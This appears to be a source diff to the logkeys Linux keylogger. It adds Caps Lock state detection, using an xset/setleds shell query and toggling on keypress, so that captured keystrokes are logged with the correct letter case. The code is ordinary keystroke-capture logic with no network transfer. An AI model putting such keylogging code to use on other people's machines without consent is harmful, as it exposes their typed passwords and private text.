@@ -19,6 +19,7 @@
 #include <netdb.h>
 #include <unistd.h>
 #include <getopt.h>
+#include <wctype.h>
 #include <sys/file.h>
 #include <sys/stat.h>
 #include <sys/socket.h>
@@ -47,6 +48,7 @@
 
 #define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
 #define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )
+#define COMMAND_STR_CAPSLOCK_STATE ("{ { xset q 2>/dev/null | grep -q -E 'Caps Lock: +on'; } || { setleds 2>/dev/null | grep -q 'CapsLock on'; }; } && echo on")
 
 #define INPUT_EVENT_PATH  "/dev/input/"  // standard path
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
@@ -472,6 +474,7 @@ int main(int argc, char **argv)
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
   char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
+  bool capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
   bool shift_in_effect = false;
   bool altgr_in_effect = false;
   bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
@@ -583,6 +586,9 @@ int main(int argc, char **argv)
         continue;  // but don't log "<Enter>"
       }
       
+      if (scan_code == KEY_CAPSLOCK)
+        capslock_in_effect = !capslock_in_effect;
+
       if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
         shift_in_effect = true;
       if (scan_code == KEY_RIGHTALT)
@@ -602,6 +608,16 @@ int main(int argc, char **argv)
               wch = char_keys[to_char_keys_index(scan_code)];
           }
         } 
+
+        else if (capslock_in_effect && iswalpha(char_keys[to_char_keys_index(scan_code)])) { // only bother with capslock if alpha
+          if (shift_in_effect) // capslock and shift cancel each other
+            wch = char_keys[to_char_keys_index(scan_code)];
+          else
+            wch = shift_keys[to_char_keys_index(scan_code)];
+          if (wch == L'\0')
+            wch = char_keys[to_char_keys_index(scan_code)];
+        }
+        
         else if (shift_in_effect) {
           wch = shift_keys[to_char_keys_index(scan_code)];
           if (wch == L'\0')
